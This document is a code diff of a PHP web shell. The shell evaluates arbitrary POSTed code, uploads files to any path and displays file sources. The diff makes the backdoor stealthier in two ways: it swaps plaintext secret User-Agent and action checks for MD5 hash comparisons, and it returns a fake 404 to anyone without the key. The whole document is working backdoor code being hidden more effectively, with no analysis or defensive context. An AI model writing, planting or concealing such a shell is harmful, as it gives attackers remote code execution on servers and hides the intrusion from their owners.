@@ -2,9 +2,9 @@
 error_reporting(0);
 error_log(0);
 
-if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") {
+if (isset($_SERVER['HTTP_USER_AGENT']) && md5($_SERVER['HTTP_USER_AGENT']) == "29753f3030aa18135b78e5cfefc73765") {
 
-   if (!empty($_GET['action']) && $_GET['action'] == "start") {
+   if (!empty($_GET['action']) && md5($_GET['action']) == "ea2b2676c28c0db26d39331a336c6b92") {
       echo '<b>Uname: </b>' . php_uname() . '<br>';
       echo '<b>Path:</b> ';
       if(isset($_GET['path'])){
@@ -58,8 +58,8 @@ if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") 
       eval($_POST['zode']);
    }
 
-
    echo '<br><b>Upload File:</b><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><input type="file" name="file"><input type=submit value="Upload"></form>';
+
    if (!empty($_FILES['file']['name'])) {
       $fullpath = $_REQUEST['path'] . $_FILES['file']['name'];
       if (@copy($_FILES['file']['tmp_name'], $fullpath)) {
@@ -80,5 +80,9 @@ if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") 
       echo show_source($path);
    }
 }
+}
+
+else {
+   header("HTTP/1.0 404 Not Found");
 }
 ?>
